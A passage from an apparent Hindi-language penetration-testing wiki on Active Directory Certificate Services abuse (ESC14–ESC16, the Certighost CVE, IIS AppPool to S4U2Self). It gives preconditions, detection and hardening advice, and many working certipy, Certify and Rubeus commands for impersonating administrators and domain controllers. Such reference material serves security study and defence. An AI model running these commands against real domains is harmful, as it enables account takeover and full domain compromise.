- **पूर्वशर्त**: Target के `altSecurityIdentities` में कमज़ोर X509SubjectOnly explicit mapping है। Attacker किसी victim principal के `cn` या `dNSHostName` attribute को इस तरह सेट कर सकता है कि वह target की X509SubjectOnly mapping के subject से मेल खाए। इसके बाद attacker victim के रूप में certificate enroll कर सकता है और इस certificate का उपयोग target के रूप में authenticate करने के लिए कर सकता है।
### ठोस कार्रवाइयाँ
#### Scenario A

Certificate template `Machine` का certificate माँगें

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 सर्टिफ़िकेट को सहेजें और कन्वर्ट करें

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 प्रमाणीकरण करें (प्रमाणपत्र का उपयोग करके)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

सफाई (वैकल्पिक)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

विभिन्न attack scenarios में अधिक विशिष्ट attack methods के लिए, कृपया निम्नलिखित देखें: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### व्याख्या

[मूल ESC15 research](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) बताती है कि V1 template के लिए किए गए request में दी गई application policies, **unpatched issuing CA** पर configured Extended Key Usage को override कर सकती हैं।<sup>[[15]](#references)</sup> किसी candidate के पास ऐसा published, enrollable template भी होना चाहिए जो आवश्यक subject/request properties की अनुमति देता हो और जिसमें कोई बाधा डालने वाला approval या signature gate न हो। केवल enrollment rights से exploitation साबित नहीं होता। Certificate Request Agent का उपयोग उपयुक्त second template और enrollment-agent restrictions पर भी निर्भर हो सकता है; इस path का दावा करने से पहले CA की patch state और issuance result की पुष्टि करें।

### दुरुपयोग

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) में उपयोग के अधिक विस्तृत उदाहरण दिए गए हैं।<sup>[[14]](#references)</sup>


यदि CA unpatched है, तो Certipy का `find` command उन V1 templates की पहचान करने में मदद कर सकता है जो संभावित रूप से ESC15 के प्रति संवेदनशील हैं।

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### परिदृश्य A: Schannel के ज़रिए Direct Impersonation

**चरण 1: "Client Authentication" Application Policy और target UPN inject करके certificate का अनुरोध करें।** Attacker `attacker@corp.local`, "WebServer" V1 template (जो enrollee-supplied subject की अनुमति देता है) का उपयोग करके `administrator@corp.local` को target करता है।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject" वाला असुरक्षित V1 template।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` जोड़ता है।
- `-upn 'administrator@corp.local'`: impersonation के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त certificate का उपयोग करके Schannel (LDAPS) के माध्यम से authenticate करें।**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### परिदृश्य B: Enrollment Agent के दुरुपयोग के जरिए PKINIT/Kerberos Impersonation

**चरण 1: ( "Enrollee supplies subject" वाले) V1 template से certificate request करें और उसमें "Certificate Request Agent" Application Policy inject करें।** यह certificate attacker (`attacker@corp.local`) को enrollment agent बनने के लिए है। यहाँ attacker की अपनी identity के लिए कोई UPN निर्दिष्ट नहीं किया जाता, क्योंकि उद्देश्य agent की क्षमता हासिल करना है।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` इंजेक्ट करता है।

**चरण 2: "agent" certificate का उपयोग करके किसी लक्षित privileged user की ओर से certificate का अनुरोध करें।** यह ESC3-जैसा चरण है, जिसमें चरण 1 के certificate को agent certificate के रूप में उपयोग किया जाता है।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**चरण 3: "on-behalf-of" प्रमाणपत्र का उपयोग करके विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में प्रमाणित करें।**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA पर Security Extension अक्षम (वैश्विक रूप से)-ESC16

### व्याख्या

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Extension के अभाव के ज़रिए Elevation of Privilege)** CA-व्यापी **szOID_NTDS_CA_SECURITY_EXT** SID extension को suppress किए जाने का वर्णन करता है। यह एक configuration indicator है, इस बात का प्रमाण नहीं कि कोई certificate किसी दूसरे account के रूप में authenticate कर सकता है। Impersonation के लिए संबंधित account attributes या mapping पर नियंत्रण, enroll किया जा सकने वाला client-authentication template, और actual domain controller या service द्वारा स्वीकार किया गया certificate mapping path भी ज़रूरी है। Full Enforcement में patched KDC, SID extension के बिना certificates को अस्वीकार करता है, जब तक कि उनके पास कोई अन्य strong mapping न हो; नीचे दी गई UPN-only Kerberos प्रक्रिया पुराने या compatibility-mode KDCs पर लागू होती है, जो अब भी weak mapping स्वीकार करते हैं। [Microsoft की certificate mapping और enforcement संबंधी guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) देखें।

विस्तृत सिद्धांत के बारे में अधिक जानने के लिए आप इस लेख का भी संदर्भ ले सकते हैं:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### दुरुपयोग

नीचे दिया गया ऐतिहासिक UPN-only Kerberos उदाहरण [Certipy के ESC16 दस्तावेज़](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) पर आधारित है। इसके लिए ऐसे KDC की आवश्यकता है जो अब भी इससे बनने वाली weak mapping स्वीकार करता हो; 9 सितंबर, 2025 के Windows security update के बाद `StrongCertificateBindingEnforcement=1` समर्थित override नहीं है।<sup>[[14]](#references)</sup>

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति vulnerable है या नहीं.

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**चरण 1: पीड़ित खाते का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापना के लिए)।  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**चरण 2: victim account का UPN, target administrator के `sAMAccountName` पर अपडेट करें।**  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**चरण 3: (यदि आवश्यक हो) "victim" account के credentials प्राप्त करें (उदा., Shadow Credentials के माध्यम से)।**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**चरण 4: ESC16-configured CA पर ऐसे client-authentication template (जैसे, "User") से "victim" user के रूप में certificate का अनुरोध करें, जिसमें account enroll कर सकता हो।** CA जारी किए गए certificate से SID security extension को हटा देता है, लेकिन केवल इससे usable authentication mapping स्थापित नहीं होती। Kerberos credential cache environment variable सेट करें (shell command):

```bash
export KRB5CCNAME=victim.ccache
```

फिर सर्टिफिकेट का अनुरोध करें:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**चरण 5: "victim" खाते का UPN पहले जैसा करें।**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**चरण 6: पुराने या compatibility-mode KDC पर, जो इस कमज़ोर मैपिंग को स्वीकार करता है, लक्ष्य एडमिनिस्ट्रेटर के रूप में authenticate करें।**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### व्याख्या

**Certighost** एक **AD CS enrollment chase / callback path** का दुरुपयोग करता है, जहाँ CA requester द्वारा दिए गए request attributes पर भरोसा करता है ताकि उस identity का पता लगाया जा सके जिसे जारी किए गए certificate में रखा जाना चाहिए। सार्वजनिक PoC में crafted request में ये शामिल होते हैं:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: attacker-नियंत्रित host/IP, जिससे CA संपर्क करेगा
- **`rmd`**: impersonate करने के लिए **target Domain Controller का DNS name**

अगर CA इस chase का पालन करता है, तो वह **SMB/LSA (`445`)** और **LDAP (`389`)** के ज़रिए attacker से संपर्क करेगा। Attacker एक **वास्तविक machine account** (आमतौर पर डिफ़ॉल्ट **`ms-DS-MachineAccountQuota`** के ज़रिए बनाया गया) इस्तेमाल करता है, ताकि callback session एक वैध domain principal के रूप में authenticate हो। लेकिन rogue services इसके बजाय **target DC** के identity attributes लौटाती हैं:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

अगर CA **लौटाई गई identity को authenticated callback principal से cryptographically bind नहीं करता**, तो वह **Domain Controller** के लिए certificate जारी कर सकता है, जबकि session attacker-नियंत्रित machine account के रूप में authenticate हुआ हो। इस वजह से यह bug अवधारणात्मक रूप से **Certifried** से अलग है: `dNSHostName` जैसे AD attributes को rewrite करने के बजाय, attacker **CA callback resolution के दौरान identity data को बदल देता है**।<sup>[[2]](#references)</sup>

**ज़रूरी पूर्वशर्तें:**

- कम विशेषाधिकार वाले **domain credentials**
- computer account **बनाने या दोबारा इस्तेमाल करने** की क्षमता
- **CA** से attacker-नियंत्रित **ports `389` और `445`** तक network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** के Microsoft update ने **`cdc` के लिए DC validation** और **resolved-SID comparison** जोड़ा)

इसके बाद मिले **`.pfx`** का इस्तेमाल **PKINIT** के लिए किया जा सकता है, जिससे **`.ccache`** बनता है और प्रकाशित PoC flow में **target DC का NT hash** भी मिलता है। आमतौर पर यह **पूरे domain को compromise करने** के लिए पर्याप्त होता है।

### दुरुपयोग

सार्वजनिक PoC पूरी chain को automate करता है:<sup>[[1]](#references)</sup>

1. Attacker-नियंत्रित **machine account** बनाएँ या दोबारा इस्तेमाल करें।
2. `389` और `445` पर **rogue LDAP और SMB/LSA listeners** शुरू करें।
3. Attacker-नियंत्रित **`cdc`** और target **`rmd`** attributes वाला certificate request सबमिट करें।
4. CA को नियंत्रित machine account के रूप में rogue listeners से authenticate होने दें, लेकिन identity lookups के जवाब में **target DC** के attributes लौटाएँ।
5. CA द्वारा signed **DC certificate** प्राप्त करें, फिर उसका इस्तेमाल **PKINIT** के लिए करें।

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC के उपयोगी runtime flags:

- `--listener <ip>`: `cdc` में विज्ञापित callback IP स्पष्ट रूप से चुनें
- `--computer-name <NAME$>`: नया machine account बनाने के बजाय मौजूदा machine account का फिर से उपयोग करें

**Operational notes:**

- PoC को **root** की आवश्यकता है, क्योंकि यह **privileged ports** `389` और `445` पर bind करता है।
- सफल exploitation स्थानीय रूप से एक **DC `.pfx`** और **Kerberos `.ccache`** लिखता है।
- चूँकि certificate एक **Domain Controller account** से map होता है, इसलिए आगे की कार्रवाइयों में **certificate-based Kerberos auth**, **DCSync**, और प्राप्त **machine NT hash** का फिर से उपयोग शामिल हो सकता है।<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment से same-host Administrator तक

`ApplicationPoolIdentity` के रूप में चलने वाला IIS pool नेटवर्क संसाधनों तक outbound access के लिए अपने host के **computer account** का उपयोग करता है। इसलिए, `IIS AppPool\<POOL>` के रूप में code execution स्थानीय token में कम privileges वाला रहता है, लेकिन ऐसा AD CS request सबमिट कर सकता है जिसे CA `HOST$` के रूप में authenticate करता है; यह outbound identity transition है, token impersonation या Potato-style local elevation नहीं।<sup>[[19]](#references)[[20]](#references)</sup>

इस chain के लिए domain-joined IIS host, RPC के ज़रिए पहुँच योग्य Enterprise CA, ऐसा प्रकाशित machine-authentication template जिसके लिए computer के पास enrollment rights हों, PKINIT support, और KDC/SMB तक पहुँच आवश्यक है। Custom pool identity outbound principal को बदल देती है, इसलिए `HOST$` मानने से पहले पुष्टि करें कि pool वास्तव में `ApplicationPoolIdentity` का उपयोग करता है।<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

IIS server से दूर key pair और CSR जनरेट करें और private key अपने पास रखें। Compromised worker से **केवल CSR** सबमिट करें। [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) `CertificateAuthority.Request` को instantiate करता है, `CertificateTemplate:Machine` सेट करता है, `ICertRequest::Submit` call करता है, और जारी किया गया certificate लौटाता है। CA configuration string `CAHOST\CA-NAME` का उपयोग करें; सामान्य `Machine` template subject को AD से बनाता है, इसलिए requester द्वारा दिया गया subject/SAN data आवश्यक नहीं है।<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

लौटाए गए certificate को **matching retained key** के साथ मिलाएँ। `certutil -MergePFX machine_cert.cer machine_cert.pfx` तभी काम करता है जब Windows पहले से certificate को किसी accessible private key से associate कर सके; अलग PEM files के लिए, PKCS#12 स्पष्ट रूप से बनाएँ:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PKINIT के लिए PFX का उपयोग करें और लौटाए गए computer TGT को तुरंत inject करने के बजाय base64 के रूप में रखें:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self और same-host service substitution

S4U2Self किसी service को **खुद के लिए** ऐसा ticket लेने देता है जिसमें किसी दूसरे user का authorization data होता है। Computer TGT के साथ, Rubeus किसी privileged user के लिए वह ticket मांग सकता है, लौटाए गए KRB-CRED में service name को CIFS से बदल सकता है और उसे inject कर सकता है। यह स्थानीय “delegate to thyself” primitive है: इसके लिए S4U2Proxy या `msDS-AllowedToDelegateTo` entry की ज़रूरत नहीं होती।<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Substituted ticket का उपयोग केवल **उसी computer account/key** की services कर सकती हैं (यहाँ, `HOST` पर CIFS)। यह अन्य domain machines के लिए दोबारा इस्तेमाल किया जा सकने वाला Administrator ticket नहीं है। साथ ही, दिखाया गया परिणाम Administrator के रूप में privileged SMB/filesystem access है; स्थानीय `NT AUTHORITY\SYSTEM` process प्राप्त करने के लिए अब भी एक अलग remote-execution step की आवश्यकता है।<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection और hardening

- CA पर, IIS server accounts द्वारा किए गए अप्रत्याशित `Machine`-template requests के लिए Certification Services events **4886** (request received) और **4887** (issued) का correlation करें।<sup>[[19]](#references)[[24]](#references)</sup>
- DCs पर, certificate pre-authentication इस्तेमाल होने पर event **4768** में certificate fields शामिल होते हैं; web-server accounts के लिए असामान्य PKINIT TGT requests पर alert करें। इसके बाद, privileged impersonated identity और उसी host से जुड़े **4769** requests देखें। चूँकि Rubeus का `/altservice` client-side पर KRB-CRED service name को rewrite करता है, इसलिए DC-side 4769 service name का `cifs` होना आवश्यक न मानें।<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` द्वारा CA RPC endpoints तक पहुँचने, अप्रत्याशित ASPX creation, Kerberos-authenticated administrative shares access और secrets-dumping activity की तलाश करें। जहाँ संभव हो, app-tier की CA RPC/KDC/SMB तक पहुँच सीमित करें और उन computer enrollment rights या machine-authentication templates को हटाएँ जिनकी संचालन के लिए आवश्यकता नहीं है।<sup>[[19]](#references)</sup>

## Passive Voice में समझाया गया Certificates के साथ Forests को Compromise करना

### Compromised CAs द्वारा Forest Trusts को तोड़ना

**Cross-forest enrollment** का configuration अपेक्षाकृत सरल बनाया गया है। Resource forest का **root CA certificate**, administrators द्वारा **account forests में प्रकाशित** किया जाता है, और resource forest के **enterprise CA certificates को हर account forest के `NTAuthCertificates` और AIA containers में जोड़ा** जाता है। स्पष्ट रूप से कहें तो, यह व्यवस्था resource forest के **CA को उन सभी अन्य forests पर पूरा नियंत्रण देती है** जिनकी PKI वह manage करता है। यदि attackers द्वारा इस CA को **compromise कर लिया जाए**, तो resource और account forests, दोनों के सभी users के certificates उनके द्वारा **forged किए जा सकते हैं**, जिससे forest की security boundary टूट जाती है।<sup>[[6]](#references)</sup>

### Foreign Principals को दिए गए Enrollment Privileges

Multi-forest environments में, उन Enterprise CAs के संबंध में सावधानी आवश्यक है जो ऐसे **certificate templates publish करते हैं** जो **Authenticated Users या foreign principals** (ऐसे users/groups जो उस forest से बाहर हों जिससे Enterprise CA संबंधित है) को **enrollment और edit rights देते हैं**।\
Trust के पार authentication होने पर, AD द्वारा **Authenticated Users SID** को user के token में जोड़ा जाता है। इसलिए, यदि किसी domain में ऐसा template वाला Enterprise CA है जो **Authenticated Users को enrollment rights देता है**, तो संभव है कि **किसी दूसरे forest का user उस template में enroll करे**। इसी तरह, यदि किसी template द्वारा **किसी foreign principal को स्पष्ट रूप से enrollment rights दिए गए हों**, तो इससे **cross-forest access-control relationship बनता है**, जो एक forest के principal को **दूसरे forest के template में enroll होने** की अनुमति देता है।

दोनों स्थितियों में एक forest से दूसरे forest तक **attack surface बढ़ जाता है**। Certificate template की settings का attacker द्वारा शोषण करके foreign domain में अतिरिक्त privileges प्राप्त किए जा सकते हैं।<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost तकनीकी विश्लेषण](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps ब्लॉग](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services का दुरुपयोग](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, नए Authentication और Request Methods, और बहुत कुछ](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover के लिए Key Trust Account Mapping का दुरुपयोग](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage की कहानी](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC के ज़रिए AD Certificate Services तक Relaying](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM के साथ ADCS CA तक Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: सिर्फ़ एक और AD CS ESC नहीं](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: गलत configuration और exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” पर फिर से विचार](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint के ज़रिए IIS AppPool से Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services का Audit](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Kerberos authentication ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Kerberos service ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
